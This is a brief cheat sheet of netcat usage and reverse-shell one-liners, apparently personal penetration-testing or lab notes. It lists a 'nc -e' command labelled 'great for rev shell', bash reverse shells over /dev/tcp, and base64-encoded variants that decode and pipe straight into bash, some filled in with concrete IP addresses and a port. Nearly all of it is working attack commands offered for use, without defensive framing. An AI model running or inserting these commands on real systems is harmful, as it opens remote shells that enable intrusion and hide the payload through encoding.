# Netcat
Comm | Desc
--- | ---
`nc -l -p <port>` | listen on port
`nc <dest_ip> <port>` | Connect to dest_ip on port
`nc <dest_ip> <port> -e <binary>` | Connect to dest_ip on port executing binary (great for rev shell)


#netcatalternative
`setsid bash -i &>/dev/tcp/IP/PORT 0>&1 &`
`bash -i &>/dev/tcp/IP/PORT 0>&1' #`
`echo $(echo 'bash -i >& /dev/tcp/IP/PORT 0>&1' | base64) | base64 -d | bash`

echo $(echo 'bash -i >& /dev/tcp/10.10.14.22/6161 0>&1' | base64) | base64 -d | bash

`setsid bash -i &>/dev/tcp/10.10.14.133/6161 0>&1 &`